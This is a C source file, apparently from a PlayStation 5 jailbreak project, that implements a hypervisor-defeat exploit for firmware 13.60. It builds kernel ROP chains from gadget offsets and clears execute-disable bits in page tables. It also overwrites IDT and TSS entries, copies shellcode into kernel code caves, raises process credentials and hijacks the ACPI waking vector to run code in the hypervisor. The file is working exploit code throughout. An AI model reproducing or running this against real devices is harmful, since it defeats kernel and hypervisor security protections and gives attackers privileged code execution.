#include "config.h"
#include "hv_defeat_13xx.h"
#include "khook.h"
#include "shellcode_1360.h"
#include "utils.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <sys/cpuset.h>
#include <unistd.h>

#define KH_POP_RSP_1360 0x291C42
#define CARRIER_PA_1360 0x3FFFF000
#define HV_HEAP_OFFSET_1360 0x83028
#define HV_PCPUS_OFFSET_1360 0x82A60

static int kernel_read(uint64_t address, void *buffer, size_t length) {
  return kernel_copyout((intptr_t)address, buffer, length);
}

static int kernel_write(uint64_t address, const void *buffer, size_t length) {
  return kernel_copyin(buffer, (intptr_t)address, length);
}

uint64_t kgadget(kgadget_t gadget) {
  uint64_t offset;

  switch (gadget) {
  case KERNEL_GADGET_PIVOT_ADD_RSP28_RET:
    offset = env_offset.GAD_PIVOT_ADD_RSP28_RET;
    break;
  case KERNEL_GADGET_IRETQ:
    offset = env_offset.GAD_IRETQ;
    break;
  case KERNEL_GADGET_POP_RAX:
    offset = env_offset.GAD_RET_TRAMP - 1;
    break;
  case KERNEL_GADGET_POP_RCX:
    offset = env_offset.GAD_POP_RCX_RET;
    break;
  case KERNEL_GADGET_POP_RDI:
    offset = env_offset.GAD_POP_RDI_RET;
    break;
  case KERNEL_GADGET_POP_RSI:
    offset = env_offset.GAD_POP_RSI_RET;
    break;
  case KERNEL_GADGET_POP_RDX:
    offset = env_offset.GAD_POP_RDX_RET;
    break;
  case KERNEL_GADGET_POP_R8:
    offset = env_offset.GAD_POP_R8_RET;
    break;
  case KERNEL_GADGET_POP_RSP:
    offset = KH_POP_RSP_1360;
    break;
  case KERNEL_GADGET_STORE_RCX_R8:
    offset = env_offset.GAD_STORE_RCX_R8_RET;
    break;
  case KERNEL_GADGET_STORE_RDI8_RCX:
    offset = env_offset.GAD_STORE_RDI8_RCX_RET;
    break;
  case KERNEL_GADGET_OR_RCX_EAX:
    offset = env_offset.GAD_OR_RCX_EAX_RET;
    break;
  case KERNEL_GADGET_SET_DR7:
    offset = env_offset.GAD_SET_DR7_RET;
    break;
  case KERNEL_GADGET_ST_RCX_RDX:
    offset = env_offset.GAD_STORE_RCX_RDX_RET;
    break;
  case KERNEL_GADGET_ST_RCX_RAX:
    offset = env_offset.GAD_STORE_RCX_RAX_RET;
    break;
  case KERNEL_GADGET_MOV_RAX_RSI:
    offset = env_offset.GAD_MOV_RAX_RSI_RET;
    break;
  case KERNEL_GADGET_MOV_RAX_RDI:
    offset = env_offset.GAD_MOV_RAX_RDI_RET;
    break;
  case KERNEL_GADGET_REP_MOVSB:
    offset = env_offset.GAD_REP_MOVSB_RET;
    break;
  case KERNEL_GADGET_CLD:
    offset = env_offset.GAD_CLD_RET;
    break;
  case KERNEL_GADGET_RET_TRAMP:
    offset = env_offset.GAD_RET_TRAMP;
    break;
  case KERNEL_GADGET_DBREG_RESUME:
    offset = env_offset.GAD_DBREG_RESUME;
    break;
  default:
    return 0;
  }

  return ktext + offset;
}

static int offsets_present(void) {
  const uint64_t required[] = {
      env_offset.ACPIGBL_FACS,
      env_offset.IDT,
      env_offset.COMMON_TSS,
      env_offset.IOMMU_SOFTC,
      env_offset.FUN_MEMCPY,
      env_offset.GAD_ADD_RSP_28_POP_RBP_RET,
      env_offset.GAD_IRETQ,
      env_offset.GAD_POP_RAX_RET,
      env_offset.GAD_POP_RDI_RET,
      env_offset.GAD_POP_RSI_RET,
      env_offset.GAD_POP_RDX_RET,
      env_offset.GAD_POP_RCX_RET,
      env_offset.GAD_POP_RSP_RET,
      env_offset.KERNEL_CODE_CAVE,
      env_offset.FUN_PRINTF,
      env_offset.FUN_HV_IOMMU_SET_BUFFERS,
      env_offset.FUN_HV_IOMM_WAIT_COMPLETION,
      env_offset.FUN_SMP_RENDEZVOUS,
      env_offset.FUN_SMP_NO_RENDEVOUS_BARRIER,
      env_offset.HV_CODE_CAVE_PA,
      env_offset.HV_HANDLE_VMEXIT_PA,
      env_offset.KERNEL_UART_OVERRIDE,
      env_offset.KERNEL_CFI_CHECK,
      env_offset.G_VBIOS,
      env_offset.FUN_TRANSMITTER_CONTROL,
      env_offset.FUN_MP3_INITIALIZE,
      env_offset.FUN_MP3_INVOKE,
      env_offset.PS5_WIFI_FW_OFFSET,
      env_offset.PS5_WIFI_FW_SIZE,
      env_offset.HV_MP_STARTUP_CALL,
      env_offset.MP_STARTUP_INIT_VECTOR,
      env_offset.DATA_CAVE,
      env_offset.GAD_PIVOT_ADD_RSP28_RET,
      env_offset.GAD_POP_R8_RET,
      env_offset.GAD_STORE_RCX_R8_RET,
      env_offset.GAD_STORE_RDI8_RCX_RET,
      env_offset.GAD_OR_RCX_EAX_RET,
      env_offset.GAD_SET_DR7_RET,
      env_offset.GAD_STORE_RCX_RDX_RET,
      env_offset.GAD_STORE_RCX_RAX_RET,
      env_offset.GAD_MOV_RAX_RSI_RET,
      env_offset.GAD_MOV_RAX_RDI_RET,
      env_offset.GAD_REP_MOVSB_RET,
      env_offset.GAD_CLD_RET,
      env_offset.GAD_RET_TRAMP,
      env_offset.GAD_DBREG_RESUME,
      env_offset.NVS_SIGNATURE,
      env_offset.HV_EFI_MAP_ROOT,
  };

  for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++) {
    if (!required[i])
      return 0;
  }

  return 1;
}

static int check_nvs_signature(void) {
  static const uint64_t expected[] = {
      0x2300,
      0x200,
      0x200,
      0,
      0x2000,
      0x800,
      0x1000,
  };

  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); i++) {
    uint64_t actual;
    uint64_t address = ktext + env_offset.NVS_SIGNATURE + i * sizeof(actual);

    if (kernel_read(address, &actual, sizeof(actual)) != 0 ||
        actual != expected[i])
      return -1;
  }

  return 0;
}

static uint64_t derive_h(void) {
  uint64_t record;

  if (kernel_read(ktext + env_offset.HV_EFI_MAP_ROOT, &record, sizeof(record)) ||
      !record || (record >> 47) != 0x1FFFF)
    return 0;

  for (size_t record_index = 0; record_index < 64; record_index++) {
    uint32_t type;
    uint32_t data_size;

    if (kernel_read(record, &type, sizeof(type)) ||
        kernel_read(record + 4, &data_size, sizeof(data_size)))
      return 0;

    if (!type && !data_size)
      return 0;
    if (data_size > 0x10000)
      return 0;

    if (type == 0x9004) {
      uint64_t map_size;
      uint64_t descriptor_size;

      if (kernel_read(record + 8, &map_size, sizeof(map_size)) ||
          kernel_read(record + 0x10, &descriptor_size, sizeof(descriptor_size)))
        return 0;

      if (descriptor_size >= 0x28 && descriptor_size <= 0x80 && map_size &&
          map_size < 0x10000) {
        uint64_t descriptor_count = map_size / descriptor_size;

        if (descriptor_count > 64)
          descriptor_count = 64;

        for (uint64_t i = 0; i < descriptor_count; i++) {
          uint64_t descriptor = record + 0x28 + i * descriptor_size;
          uint32_t memory_type;
          uint64_t physical_base;
          uint64_t pages;

          if (kernel_read(descriptor, &memory_type, sizeof(memory_type)) ||
              kernel_read(descriptor + 8, &physical_base,
                          sizeof(physical_base)) ||
              kernel_read(descriptor + 0x18, &pages, sizeof(pages)))
            return 0;

          if (memory_type == 0 && pages <= (UINT64_MAX >> 12) &&
              physical_base && physical_base < 0x100000000) {
            uint64_t region_size = pages << 12;

            if (region_size > 0x17FFFFF && region_size < 0x4000001)
              return physical_base;
          }
        }
      }
    }

    uint64_t advance = ((uint64_t)data_size + 7) & ~7ULL;
    advance += 8;
    if (record > UINT64_MAX - advance)
      return 0;
    record += advance;
  }

  return 0;
}

static int clear_execute_disable(uint64_t address) {
  uint64_t table = cr3;

  for (int level = 0; level < 4; level++) {
    int shift = 39 - level * 9;
    uint64_t index = (address >> shift) & 0x1FF;
    uint64_t entry_address = dmap + (table & 0x000FFFFFFFFFF000ULL) + index * 8;
    uint64_t entry;

    if (kernel_read(entry_address, &entry, sizeof(entry)) || !(entry & 1))
      return -1;

    if (entry & (1ULL << 63)) {
      entry &= ~(1ULL << 63);
      if (kernel_write(entry_address, &entry, sizeof(entry)))
        return -1;
    }

    if (((level == 1 || level == 2) && (entry & 0x80)) || level == 3)
      return 0;

    table = entry & 0x000FFFFFFFFFF000ULL;
  }

  return -1;
}

static int build_sx_rop(uint64_t ist, size_t shellcode_kernel_len) {
  uint64_t rop[] = {
      ktext + env_offset.GAD_POP_RCX_RET,
      dmap + 0xC0115110,
      ktext + env_offset.GAD_POP_RAX_RET,
      0x200,
      ktext + env_offset.GAD_OR_RCX_EAX_RET,
      ktext + env_offset.GAD_POP_RCX_RET,
      dmap + 0xC1010104,
      ktext + env_offset.GAD_POP_RAX_RET,
      0x53,
      ktext + env_offset.GAD_OR_RCX_EAX_RET,
      ktext + env_offset.GAD_POP_RDI_RET,
      ktext + env_offset.KERNEL_CODE_CAVE,
      ktext + env_offset.GAD_POP_RSI_RET,
      kernel_cave_shellcode,
      ktext + env_offset.GAD_POP_RDX_RET,
      shellcode_kernel_len,
      ktext + env_offset.FUN_MEMCPY,
      ktext + env_offset.GAD_POP_RCX_RET,
      dmap + 0xC1010104,
      ktext + env_offset.GAD_POP_RAX_RET,
      0x4D,
      ktext + env_offset.GAD_OR_RCX_EAX_RET,
      ktext + env_offset.KERNEL_CODE_CAVE,
  };

  return kernel_write(ist + 0x1000, rop, sizeof(rop));
}

static int setidt(int index, uint64_t function, int type, int dpl, int ist) {
  struct gate_descriptor descriptor = {};

  descriptor.gd_looffset = function;
  descriptor.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  descriptor.gd_ist = ist;
  descriptor.gd_xx = 0;
  descriptor.gd_type = type;
  descriptor.gd_dpl = dpl;
  descriptor.gd_p = 1;
  descriptor.gd_hioffset = function >> 16;

  return kernel_write(ktext + env_offset.IDT +
                           index * sizeof(struct gate_descriptor),
                       &descriptor, sizeof(descriptor));
}

static int pin_to_core_reborn(int core) {
  cpusetid_t cpuset_id;
  uint64_t cpuset_affinity[2] = {0xFFFF, 0};
  uint64_t affinity[2];

  if (core < 0 || core >= 16)
    return -1;
  if (cpuset(&cpuset_id))
    return -1;

  cpuset_setaffinity(3, 3, cpuset_id, sizeof(uint64_t),
                     (const cpuset_t *)cpuset_affinity);
  affinity[0] = 1ULL << (15 - core);
  affinity[1] = 0;
  return cpuset_setaffinity(3, 1, -1, 0x10, (const cpuset_t *)affinity);
}

static int install_startup_hook(uint64_t hv_base) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buffer[0x800];
  uint64_t data_cave = ktext + env_offset.DATA_CAVE;
  uint64_t carrier = dmap + CARRIER_PA_1360;
  uint64_t oracle;
  int result;

  if (kernel_write(data_cave + 0x1000, stock_shellcode_ap_1360,
                   stock_shellcode_ap_1360_len))
    return -1;

  result = kh_init(&hook, kernel_read, kernel_write, ktext, data_cave, 6);
  if (result)
    return result;

  hook.tss_stride = 0x68;
  kh_set_tables(&hook, ktext + env_offset.IDT, ktext + env_offset.COMMON_TSS);
  kh_set_core(&hook, 0);
  hook.oneshot = env_offset.GAD_SET_DR7_RET != 0;
  kh_set_hook_target(&hook, ktext + env_offset.HV_MP_STARTUP_CALL);
  kh_set_resume_rsi(&hook, carrier);
  kh_set_resume_rdx(&hook, cr3);

  oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buffer, sizeof(chain_buffer));
  kh_chain_store(&chain, oracle, 0);
  kh_chain_memcpy(&chain, carrier, data_cave + 0x1000, 0xF00);
  kh_chain_store(&chain, carrier + 0xF00,
                 ktext + env_offset.MP_STARTUP_INIT_VECTOR);
  kh_chain_store(&chain, carrier + 0xF08, dmap);
  kh_chain_store(&chain, carrier + 0xF10, oracle);
  kh_chain_store(&chain, carrier + 0xF18, hv_base);
  kh_chain_store(&chain, carrier + 0xF20,
                 hv_base + HV_HEAP_OFFSET_1360);
  kh_chain_store(&chain, carrier + 0xF28,
                 hv_base + HV_PCPUS_OFFSET_1360);
  kh_chain_store(&chain, carrier + 0xF30, 1);

  if (chain.err || clear_execute_disable(carrier))
    return -1;

  result = kh_install(&hook, &chain);
  if (result)
    return result;

  kh_trigger(&hook);
  return 0;
}

int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
  uint64_t hv_base;
  uint64_t ist_pa;
  uint64_t ist;
  uint64_t ist7;
  uint64_t waking_vector;
  int result;

  if (fw != 0x1360 || !shellcode_kernel || !shellcode_kernel_len ||
      !offsets_present()) {
    notify("13.60 offsets incomplete\n");
    return -1;
  }

  if (check_nvs_signature()) {
    notify("13.60 firmware signature check failed\n");
    return -1;
  }

  hv_base = derive_h();
  if (!hv_base) {
    notify("13.60 hypervisor base was not found\n");
    return -1;
  }

  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
  result = pin_to_core_reborn(0);
  if (result) {
    notify("13.60 core pin failed (%d)\n", result);
    return -1;
  }

  result = install_startup_hook(hv_base);
  if (result) {
    notify("13.60 startup hook failed (%d)\n", result);
    return -1;
  }

  ist_pa = alloc_page();
  if (!ist_pa)
    return -1;
  ist = pa_to_dmap(ist_pa);
  if (build_sx_rop(ist, shellcode_kernel_len))
    return -1;

  ist7 = ist + 0x1000;
  result = kernel_write(ktext + env_offset.COMMON_TSS +
                            offsetof(struct amd64tss, tss_ist7),
                        &ist7, sizeof(ist7));
  if (result ||
      setidt(0x0D, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, 0xE, 0, 7) ||
      setidt(0x1E, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, 0xE, 0, 7))
    return -1;

  waking_vector = ktext + env_offset.ACPIGBL_FACS - 8;
  return kernel_write(ktext + env_offset.ACPIGBL_FACS, &waking_vector,
                      sizeof(waking_vector));
}
